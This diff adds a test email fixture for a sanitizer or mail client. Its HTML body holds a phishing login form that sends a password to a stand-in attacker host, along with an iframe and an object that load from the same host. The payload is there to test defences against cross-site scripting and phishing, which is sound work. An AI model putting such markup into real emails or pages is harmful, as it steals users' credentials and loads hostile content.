@@ -1,0 +1,9 @@
+From: Bob Sender <bob@golub.test>
+To: Alice <alice@golub.test>
+Date: Mon, 02 Nov 2026 10:00:00 +0100
+Message-ID: <xss-form-and-iframe@golub.test>
+Subject: XSS form and iframe
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><form action="https://evil.test/phish"><input name="password" type="password"><button>Login</button></form><iframe src="https://evil.test/frame"></iframe><object data="https://evil.test/o"></object></body></html>
